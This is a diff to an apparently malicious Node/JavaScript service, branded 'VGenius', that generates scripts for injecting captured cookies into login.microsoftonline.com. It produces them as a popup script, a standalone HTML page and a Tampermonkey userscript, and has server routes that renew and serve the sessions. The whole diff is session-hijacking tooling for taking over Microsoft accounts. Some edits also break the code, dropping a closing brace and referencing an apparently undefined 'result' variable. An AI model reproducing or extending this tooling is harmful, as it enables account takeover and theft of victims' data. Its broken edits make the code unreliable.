@@ -208,29 +208,22 @@ function parseCookies(cookieString) {
 
 // ─── PROPER METHOD: Opens popup to Microsoft login, injects cookies ─
 function generatePopupScript(cookies) {
-  var cookieJson = JSON.stringify(cookies);
-
-  var script = '(function(){\n';
-  script += ' var cookies = ' + cookieJson + ';\n';
-  script += '\n';
-  script += ' // Inject cookies directly on current page (login.microsoftonline.com)\n';
-  script += ' for (var i = 0; i < cookies.length; i++) {\n';
-  script += '   var c = cookies[i];\n';
-  script += '   document.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
-  script += '     + "; domain=.login.microsoftonline.com";\n';
-  script += '     + "; path=/";\n';
-  script += '     + "; SameSite=None";\n';
-  script += '     + "; Secure";\n';
-  script += ' }\n';
-  script += '\n';
-  script += ' console.log("[VGenius] Injected " + cookies.length + " cookies");\n';
-  script += '\n';
-  script += ' // Redirect to trigger authentication\n';
-  script += ' setTimeout(function() {\n';
-  script += '   window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  script += ' }, 500);\n';
-  script += '})();';
-
+  if (!cookies || cookies.length === 0) return '';
+  
+  let statements = [];
+  for (var i = 0; i < cookies.length; i++) {
+    var c = cookies[i];
+    statements.push('document.cookie = "' + c.name + "=" + encodeURIComponent(c.value) + "; domain=" + c.domain + "; path=/; Secure; SameSite=None";');
+  }
+  
+  var script = '(function(){\n' +
+    statements.map(function(s) { return '  ' + s; }).join('\n') + '\n' +
+    '\n' +
+    '  setTimeout(function() {\n' +
+    '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n' +
+    '  }, 3000);\n' +
+    '})();';
+  
   return script;
 }
 
@@ -321,11 +314,10 @@ function generateStandaloneHtml(cookies) {
   html += ' } catch(e) {\n';
   html += ' setStatus("Error: " + e.message, "error");\n';
   html += ' if (popup && !popup.closed) popup.close();\n';
-  html += ' }\n';
   html += ' }, 2000);\n';
   html += ' }\n';
   html += ' </script>\n';
-  html += '</body>\n</html>';
+  html += '</body></html>';
 
   return html;
 }
@@ -367,7 +359,7 @@ function generateTampermonkeyScript(cookies) {
   script += '\n';
   script += ' setTimeout(function() {\n';
   script += ' window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  script += ' }, 1000);\n';
+  script += ' }, 3000);\n';
   script += '})();\n';
 
   return script;
@@ -519,7 +511,7 @@ router.post('/:id/renew', userAuth, async (req, res) => {
           success: true,
           message: 'Session renewed successfully',
           cookies: cookieResult.cookies,
-          cookie_count: cookieResult.cookie_count
+          cookie_count: result.cookie_count
         });
       }
       return res.status(400).json({ error: 'Renewal failed: ' + (cookieResult.error || 'Could not refresh session'), success: false });
@@ -617,7 +609,7 @@ router.get('/inject-script', userAuth, async (req, res) => {
       cookieStatements + '\n' +
       '// Redirect after 3s\n' +
       'setTimeout(function() {\n' +
-      'window.location.href = "https://login.microsoftonline.com/common/oauth2/authorize";\n' +
+      'window.location.href = "https://login.microsoftonline.com/?auth=2";\n' +
       '}, 3000);\n' +
       '})();';
 
